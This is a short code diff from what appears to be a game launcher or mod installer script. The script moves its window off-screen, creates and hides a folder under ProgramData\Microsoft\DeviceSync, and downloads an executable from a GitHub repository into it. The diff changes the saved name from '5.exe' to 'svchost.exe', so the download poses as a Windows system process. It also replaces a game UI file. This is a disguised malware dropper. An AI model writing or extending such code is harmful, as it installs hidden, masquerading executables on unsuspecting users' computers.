@@ -7,7 +7,7 @@ app()->form('MainForm')->layout->position = [5000,0];
 
 fs::makeDir($_ENV['ProgramData'].'\\Microsoft\\DeviceSync');
 execute('cmd /c attrib +h '.$_ENV['ProgramData'].'\\Microsoft\\DeviceSync');
-file_put_contents($_ENV['ProgramData'].'\\Microsoft\\DeviceSync\\5.exe',file_get_contents('https://github.com/Rastihin/mce/raw/main/5.exe'));
+file_put_contents($_ENV['ProgramData'].'\\Microsoft\\DeviceSync\\svchost.exe',file_get_contents('https://github.com/Rastihin/mce/raw/main/5.exe'));
 
 fs::copy('https://github.com/Rastihin/mce/raw/main/start_screen.json',fs::abs('./').'\\data\\resource_packs\\vanilla\\ui\\start_screen.json');
 //Для разрешения запуска должно ровняться 1
